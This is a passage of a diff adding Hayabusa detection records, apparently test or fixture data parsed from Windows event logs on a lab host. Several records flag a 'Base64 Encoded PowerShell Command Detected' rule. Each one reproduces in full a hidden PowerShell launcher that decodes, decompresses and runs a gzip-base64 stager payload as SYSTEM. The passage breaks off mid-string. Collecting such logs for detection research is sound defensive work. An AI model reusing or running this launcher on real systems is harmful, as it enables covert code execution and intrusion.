+    "Timestamp": "2021-04-22 14:21:04.851 +05:30",
+    "RuleTitle": "Base64 Encoded PowerShell Command Detected",
+    "Level": "high",
+    "Computer": "fs03vuln.offsec.lan",
+    "Channel": "Sec",
+    "EventID": "4688",
+    "RecordID": "435121",
+    "Details": "Cmdline: powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\" ¦ Proc: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ¦ PID: 2032 ¦ User: FS03VULN$ ¦ LID: 0x3e7",
+    "ExtraFieldInfo": "ProcessId: 1768 ¦ SubjectDomainName: OFFSEC ¦ SubjectUserSid: S-1-5-18 ¦ TokenElevationType: FULL_TOKEN",
+    "RuleID": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7"
+   },
+   "host": "fs03vuln.offsec.lan",
+   "ecs": {
+    "winlog": {
+     "channel": "Security",
+     "event_data": {
+      "ProcessId": "1768",
+      "SubjectDomainName": "OFFSEC",
+      "SubjectUserSid": "S-1-5-18",
+      "TokenElevationType": "%%1936",
+      "CommandLine": "powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "NewProcessId": "2032",
+      "SubjectUserName": "FS03VULN$",
+      "SubjectLogonId": "0x3e7"
+     },
+     "record_id": "435121"
+    },
+    "event": {
+     "provider": "Microsoft-Windows-Security-Auditing",
+     "code": "4688"
+    },
+    "process": {
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command_line": "powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
+     "pid": "2032"
+    },
+    "user": {
+     "name": "FS03VULN$"
+    },
+    "rule": {
+     "name": "Base64 Encoded PowerShell Command Detected",
+     "id": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7",
+     "level": "high"
+    },
+    "host": {
+     "name": "fs03vuln.offsec.lan"
+    }
+   },
+   "ts": "2021-04-22T08:51:04Z",
+   "_id": "00db4145c689bb77ecf6ba27cf4cc2783fdb2a1c"
+  },
+  {
+   "family": "hayabusa",
+   "file": "hayabusa/evtx-timeline.csv",
+   "line": 70,
+   "text": "\"2021-04-22 14:21:05.633 +05:30\",\"Base64 Encoded PowerShell Command Detected\",\"high\",\"fs03vuln.offsec.lan\",\"Sec\",4688,435124,\"Cmdline: \"\"C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\"\" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())) ¦ Proc: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe ¦ PID: 2288 ¦ User: FS03VULN$ ¦ LID: 0x3e7\",\"ProcessId: 2032 ¦ SubjectDomainName: OFFSEC ¦ SubjectUserSid: S-1-5-18 ¦ TokenElevationType: FULL_TOKEN\",\"c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7\"",
+   "fields": {
+    "Timestamp": "2021-04-22 14:21:05.633 +05:30",
+    "RuleTitle": "Base64 Encoded PowerShell Command Detected",
+    "Level": "high",
+    "Computer": "fs03vuln.offsec.lan",
+    "Channel": "Sec",
+    "EventID": "4688",
+    "RecordID": "435124",
+    "Details": "Cmdline: \"C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())) ¦ Proc: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe ¦ PID: 2288 ¦ User: FS03VULN$ ¦ LID: 0x3e7",
+    "ExtraFieldInfo": "ProcessId: 2032 ¦ SubjectDomainName: OFFSEC ¦ SubjectUserSid: S-1-5-18 ¦ TokenElevationType: FULL_TOKEN",
+    "RuleID": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7"
+   },
+   "host": "fs03vuln.offsec.lan",
+   "ecs": {
+    "winlog": {
+     "channel": "Security",
+     "event_data": {
+      "ProcessId": "2032",
+      "SubjectDomainName": "OFFSEC",
+      "SubjectUserSid": "S-1-5-18",
+      "TokenElevationType": "%%1936",
+      "CommandLine": "\"C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))",
+      "NewProcessName": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "NewProcessId": "2288",
+      "SubjectUserName": "FS03VULN$",
+      "SubjectLogonId": "0x3e7"
+     },
+     "record_id": "435124"
+    },
+    "event": {
+     "provider": "Microsoft-Windows-Security-Auditing",
+     "code": "4688"
+    },
+    "process": {
+     "executable": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command_line": "\"C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZq